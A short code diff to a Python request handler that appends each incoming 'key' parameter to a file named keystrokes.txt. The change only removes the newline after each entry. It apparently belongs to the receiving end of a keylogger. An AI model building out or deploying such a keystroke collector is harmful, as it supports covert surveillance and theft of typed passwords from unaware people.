@@ -10,7 +10,7 @@ def handle_request():
     # Open the file and append the 'key' value if it exists
     if key_value:
         with open("keystrokes.txt", "a") as file:
-            file.write(key_value + "\n")
+            file.write(key_value)
         print(f"Received 'key' value: {key_value}")
     else:
         print("No 'key' parameter found.")
